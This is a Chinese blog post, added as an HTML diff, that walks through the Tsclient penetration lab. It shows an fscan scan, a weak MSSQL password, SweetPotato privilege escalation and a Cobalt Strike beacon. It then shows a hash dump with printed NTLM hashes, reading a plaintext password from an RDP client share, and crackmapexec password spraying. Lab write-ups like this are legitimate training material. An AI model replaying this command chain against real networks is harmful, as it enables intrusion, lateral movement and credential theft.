@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="1fscan.exe -h 39.98.115.156 -p 1-65535  扫出来个弱口令 1234567891011121314151617181920212223242526272829303132   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; _">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Tsclient">
+<meta property="og:url" content="https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="1fscan.exe -h 39.98.115.156 -p 1-65535  扫出来个弱口令 1234567891011121314151617181920212223242526272829303132   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; _">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443724183-177501a1-87b3-45a3-9d70-d5e75b088623.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443800119-c4483b69-c6f9-4186-80ed-6cd748248090.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443872575-480c900b-24bf-4aa1-96b9-f531dcb71071.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443988745-1efbf0ed-a61b-4d1e-a1b6-f0627fc81b64.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444108965-3acc996d-3a3f-4fa6-a9ef-4699130d34b6.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444235470-b27a7ef9-28c9-48cc-92db-e62304093bf1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444487178-f46b1ee9-8cae-4516-8c27-fdbfaa35c59e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444718790-7ec5853d-4274-41d0-89f1-5d6beac98d4b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444913017-4d52ed6c-9bbb-4777-a74a-c3d27f969e74.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741445001474-2d5f5420-ae6c-449f-88dc-e0ef461980c5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741445055034-473b7f38-cc62-4455-b4f4-e799c249b3de.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741446240773-bb137f87-a0c6-4990-b0b8-181e6672be95.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741447925599-9ba3f1fa-aa1b-4a14-8662-09aabef0462a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448063842-2e1fa2df-6c72-4884-8b10-a5ec19dae597.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448135705-8c08e0d8-23dd-4cb0-af1d-dcbb1cd1d9e5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448228147-a182c7cf-589f-4f6b-b37e-f9d48fb7c722.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448264695-8356a888-7f2f-45b4-93e7-f57090fa4043.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448348642-c2c5ed78-479c-4d44-bcfc-35bc9d0c7e15.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448414949-60f9ecb4-bc63-4823-a9d5-771bb3ee383b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448467481-3bef3f71-fc9b-42b7-aede-ef0c42ea7634.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448495441-30436640-c5bf-4733-a638-ea73314f06d1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448511939-73fff185-971f-45cd-b2ed-01dba133f81d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448672587-ff6a7d36-7d89-44b7-b29f-6aaafd4fc075.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741449116342-55a2b929-81fa-449c-ad59-213b9ac3c716.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741449471016-e7b09fca-8daa-41f8-9f29-432b21f3ddab.png">
+<meta property="article:published_time" content="2025-03-08T14:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-09T07:22:00.852Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443724183-177501a1-87b3-45a3-9d70-d5e75b088623.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云境-Tsclient</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/02/06/%E5%9F%9F/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&text=春秋云境-Tsclient"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&is_video=false&description=春秋云境-Tsclient"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Tsclient&body=Check out this article: https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&name=春秋云境-Tsclient&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&t=春秋云境-Tsclient"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">数据库提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">3.</span> <span class="toc-text">映像劫持</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云境-Tsclient
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-08T14:51:29.000Z" class="dt-published" itemprop="datePublished">2025-03-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.98.115.156 -p 1-65535</span><br></pre></td></tr></table></figure>
+
+<p>扫出来个弱口令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.115.156:110 open</span><br><span class="line">39.98.115.156:25 open</span><br><span class="line">39.98.115.156:80 open</span><br><span class="line">39.98.115.156:1433 open</span><br><span class="line">39.98.115.156:2383 open</span><br><span class="line">39.98.115.156:3389 open</span><br><span class="line">39.98.115.156:16450 open</span><br><span class="line">39.98.115.156:16452 open</span><br><span class="line">39.98.115.156:16451 open</span><br><span class="line">39.98.115.156:16453 open</span><br><span class="line">39.98.115.156:17001 open</span><br><span class="line">39.98.115.156:47001 open</span><br><span class="line">39.98.115.156:49665 open</span><br><span class="line">39.98.115.156:49664 open</span><br><span class="line">39.98.115.156:49666 open</span><br><span class="line">39.98.115.156:49668 open</span><br><span class="line">39.98.115.156:49669 open</span><br><span class="line">39.98.115.156:49683 open</span><br><span class="line">39.98.115.156:49705 open</span><br><span class="line">[*] alive ports len is: 19</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.98.115.156:47001 code:404 len:315    title:Not Found</span><br><span class="line">[*] WebTitle http://39.98.115.156      code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 39.98.115.156:1433:sa 1qaz!QAZ</span><br><span class="line">已完成 18/19 [-] (57/210) rdp 39.98.115.156:3389 administrator Aa123123 remote error: tls: access denied</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>数据库直接上MDUT</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443724183-177501a1-87b3-45a3-9d70-d5e75b088623.png"></p>
+<p>权限有点低，上甜土豆</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443800119-c4483b69-c6f9-4186-80ed-6cd748248090.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443872575-480c900b-24bf-4aa1-96b9-f531dcb71071.png"></p>
+<p>读一下admin目录下，发现flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;type C:\Users\Administrator\flag\flag01.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443988745-1efbf0ed-a61b-4d1e-a1b6-f0627fc81b64.png"></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>传个cs🐎</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;C:/Users/Public/beacon.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444108965-3acc996d-3a3f-4fa6-a9ef-4699130d34b6.png"></p>
+<p>传个fscan扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Public/fscan.exe -h 172.22.8.0/24</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.8.46     is alive</span><br><span class="line">(icmp) Target 172.22.8.15     is alive</span><br><span class="line">(icmp) Target 172.22.8.31     is alive</span><br><span class="line">(icmp) Target 172.22.8.18     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">   [-&gt;]2001:0:348b:fb58:188a:17bd:d89d:8c63</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br></pre></td></tr></table></figure>
+
+<p>收集用户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444235470-b27a7ef9-28c9-48cc-92db-e62304093bf1.png"></p>
+<p>此时是system起的🐎所以直接dump下来hash就行，直接会话框交互hashdump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: 82541 bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::</span><br></pre></td></tr></table></figure>
+
+<p>看看john在不在线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst</span><br></pre></td></tr></table></figure>
+
+<p>看到john在线，尝试注入进程上线，</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444487178-f46b1ee9-8cae-4516-8c27-fdbfaa35c59e.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444718790-7ec5853d-4274-41d0-89f1-5d6beac98d4b.png"></p>
+<p>看一下网络</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444913017-4d52ed6c-9bbb-4777-a74a-c3d27f969e74.png"></p>
+<p>读取一下共享文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\TSCLIENT\C</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741445001474-2d5f5420-ae6c-449f-88dc-e0ef461980c5.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type \\tsclient\c\credential.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741445055034-473b7f38-cc62-4455-b4f4-e799c249b3de.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br></pre></td></tr></table></figure>
+
+<p>提示映像劫持，起个代理,kali密码喷洒一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure>
+
